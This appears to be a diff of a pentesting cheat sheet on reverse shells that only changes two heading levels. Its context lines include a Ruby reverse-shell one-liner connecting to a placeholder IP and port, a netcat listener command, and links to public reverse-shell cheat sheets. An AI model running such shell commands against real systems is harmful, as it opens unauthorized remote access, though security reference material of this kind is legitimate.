@@ -154,7 +154,7 @@ ruby -rsocket -e 'c=TCPSocket.new("[IP]","[PORT]");while(cmd=c.gets);IO.popen(cm
 ```
 ---
 
-### Catching Shells
+## Catching Shells
 **Metasploit**
 
 ```shell
@@ -168,7 +168,7 @@ nc -lvnp [PORT]
 ```
 - can use `-vv`/`-vvv` to debug with extra verbosity
 
-### Useful links
+## Useful links
 - <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
 - <http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html>
 - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
